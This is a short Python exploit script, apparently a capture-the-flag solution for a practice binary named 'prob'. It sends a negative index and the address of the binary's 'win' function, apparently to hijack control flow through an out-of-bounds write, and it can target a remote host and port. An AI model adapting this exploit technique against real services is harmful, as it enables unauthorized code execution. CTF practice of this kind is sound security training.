#!/usr/bin/python3
from pwncus import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./prob', checksec=False)


def GDB(): gdb.attach(p, gdbscript='''

b*0x00000000004012a7
c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

def exploit():

    p.sendlineafter(b"val: ", str(-15))
    p.sendlineafter(b"val: ", str(int(exe.symbols['win'])))


    interactive()

if __name__ == '__main__':
    exploit()
